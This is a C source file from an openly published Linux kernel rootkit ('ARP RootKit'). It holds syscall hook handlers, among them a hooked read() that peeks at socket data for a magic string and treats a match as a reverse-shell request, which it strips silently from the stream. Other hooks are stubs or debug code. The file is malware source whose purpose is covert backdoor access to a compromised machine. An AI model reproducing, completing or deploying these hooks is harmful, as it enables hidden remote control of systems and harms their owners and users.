/***
 *      _  __  __     __
 *     /_) )_) )_)    )_) _   _  _)_ )_/ o _)_
 *    / / / \ /      / \ (_) (_) (_ /  ) ( (_
 *
 *//* License
 *
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 *//* Notes
 *
 * Here the hook handlers.
 */

#include "hooks.h"

asmlinkage int my_recvfrom64(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len) {
	int ret = 0;

	//SYSCALL64(__NR_write, 1, "hello from hook!\n", 17, 0, 0, 0);
	//ret = SYSCALL64(__NR_recvfrom, fd, ubuf, size, flags, addr, addr_len);
	return ret;
}

asmlinkage int my_recvfrom32(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len) {
    int ret = 0;

    SYSCALL64(__NR_write, 1, "hello from hook!\n", 17, 0, 0, 0);
    //ret = SYSCALL32(__NR_recvfrom, fd, ubuf, size, flags, addr, addr_len);
    return ret;
}

#define RSHELL_KEY "OLA K ASE\n"

asmlinkage int my_read64(int fd, void *buf, size_t len) {
	//int ret = 0;
	char *ubuf = NULL;
	int nread = 0;
	/*
	pid_t pid = 0;
	off_t from = 0, to = 0;
	struct read_queue *queue = NULL;

	pid = SYSCALL64(__NR_getpid, 0, 0, 0, 0, 0, 0);

	// serve queue as request if there's one.
	if ((queue = get_read_queue(pid))) {
		ubuf = queue->ubuf;
		from = queue->from;
		to = queue->to;

		nread = to - from;
		if (nread <= len) {
			f_memcpy(buf, ubuf + from, nread);
			destroy_read_queue(pid);
			SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
			return nread;
		} else {
			f_memcpy(buf, ubuf + from, len);
			update_read_queue(pid, ubuf, from + len, to);
			return len;
		}
	} else {
		// check if the pending data is the shell request
		ret = SYSCALL64(__NR_ioctl, fd, FIONREAD, &nread, 0, 0, 0);
		f_printk("ioctl ret = %d\n", ret);
		if (!ret) {
			if (nread == sizeof(RSHELL_KEY) - 1) {
				f_printk("%d bytes to read\n", nread);
				ubuf = (void *) SYSCALL64(__NR_mmap, 0, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
				if (ubuf == MAP_FAILED) {
					return SYSCALL64(__NR_read, fd, buf, len, 0, 0, 0);
				}
				ret = SYSCALL64(__NR_read, fd, ubuf, nread, 0, 0, 0);
				if (ret < 0) {
					SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
					return my_read64(fd, buf, len);
				}
				if (f_strncmp(RSHELL_KEY, ubuf, nread) == 0) {
					f_printk("GOT RSHELL REQUEST!\n");
					SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
					return my_read64(fd, buf, len);
				}
				// at this point, we received a same sized than the shell request packet, but it's not a request packet.
				// so, we must queue it, if the user read less than we did, and leave it to the users, the same speed they read,
				// on the next calls to sys_read() (which is now my_read64()).
				if (nread <= len) {
					f_memcpy(buf, ubuf, nread);
					SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
					return nread;
				} else {
					f_memcpy(buf, ubuf, len);
					create_read_queue(pid, ubuf, len, nread);
					return len;
				}
			}
		}
	}

	return SYSCALL64(__NR_read, fd, buf, len, 0, 0, 0);
	*/

	ubuf = (void *) SYSCALL64(__NR_mmap, 0, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if (ubuf != MAP_FAILED) {
		// MSG_KEEP is the key to keep the data in the queue.
		// then we can compare and serve it without doing a lot of work.
		nread = SYSCALL64(__NR_recvfrom, fd, ubuf, sizeof(RSHELL_KEY) - 1, MSG_PEEK, 0, 0);
		if (nread >= 0) {
			f_printk("recvfrom %d bytes\n", nread);
		}
		if (nread == sizeof(RSHELL_KEY) - 1 && f_memcmp(ubuf, RSHELL_KEY, nread) == 0) {
			f_printk("GOT RSHELL REQUEST\n");
			// empty buffer
			nread = SYSCALL64(__NR_recvfrom, fd, ubuf, sizeof(RSHELL_KEY) - 1, 0, 0, 0);
			if (nread == sizeof(RSHELL_KEY) - 1) {
				f_printk("emptying buffer and calling myself...\n");
				SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
				return my_read64(fd, buf, len);
			}
			SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
		}
		SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
	}

	return SYSCALL64(__NR_read, fd, buf, len, 0, 0, 0);
}

asmlinkage int my_read32(int fd, void *buf, size_t len) {
	return 0;
}
